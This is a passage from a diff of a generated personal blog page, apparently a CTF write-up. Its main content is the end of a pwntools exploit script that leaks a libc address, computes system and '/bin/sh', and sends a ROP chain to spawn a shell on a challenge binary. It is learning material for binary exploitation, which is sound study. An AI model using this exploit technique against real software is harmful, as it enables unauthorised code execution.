class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1376,14 +1372,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">41</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
